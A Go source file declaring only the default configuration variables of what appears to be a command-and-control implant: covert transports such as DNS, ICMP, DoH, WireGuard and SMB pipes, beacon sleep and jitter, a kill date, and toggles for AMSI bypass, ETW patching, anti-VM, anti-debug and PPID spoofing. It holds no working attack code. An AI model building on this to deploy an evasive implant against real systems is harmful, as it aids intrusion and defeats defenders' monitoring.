package main

var (
	DefaultURL             = "https://127.0.0.1:9443"
	DefaultProfile         = "default"
	ServerPubKeyPem        = ""
	ClientCertPem          = ""
	ClientKeyPem           = ""
	RootCAPem              = ""
	ProfileJSON            = ""
	AgentPrivKeyPem        = ""

	TransportMode = ""

	DNSDomain     = ""
	DNSResolver   = ""

	ICMPHost      = ""

	DoHResolver   = ""
	DoHHostHeader = ""
	DoHUserAgent  = ""

	DNSVerbB            = ""
	DNSVerbT            = ""
	DNSVerbR            = ""
	DNSPayloadChunkSize = "0"

	WebSocketURL = ""

	WireGuardServerPubKey = ""
	WireGuardServerAddr   = ""
	WireGuardAgentPrivKey = ""
	WireGuardTunnelIP     = ""
	WireGuardServerTunnelIP = "10.99.0.1"
	WireGuardInnerPort = "8881"

	SMBPipe      = ""
	SMBRelayPipe = ""

	TCPBindAddr    = ""
	TCPBindToken   = ""
	TCPRelayTarget = ""
	TCPRelayToken  = ""

	TCPRevListen = ""
	TCPRevTarget = ""
	TCPRevToken  = ""

	TransportFailoverAfterRaw = "3"
	ServerECDHPubkey          = ""
	ObfKeyHex                 = ""
	PivotPrivKeyB64           = ""
	PivotPubKeyB64            = ""
	InjectMethodDefault       = "default"
	TLSProfile                = "go"
	WorkHoursStartRaw         = "08:00"
	WorkHoursEndRaw           = "19:00"
	SleepMaskType             = "none"
	SyscallMethod             = "direct"
	VerboseRaw                = "false"

	DefaultSleepSecondsRaw = "60"
	DefaultJitterRaw       = "0.3"
	KillDaysRaw            = "30"
	AntiSandboxEnabledRaw  = "false"
	SleepMaskEnabledRaw    = "false"
	AmsiBypassRaw          = "false"
	EtwPatchRaw            = "false"
	StringObfuscationRaw   = "false"
	PpidSpoofRaw           = "false"
	AntiDebugRaw           = "false"
	AntiVmRaw              = "false"
)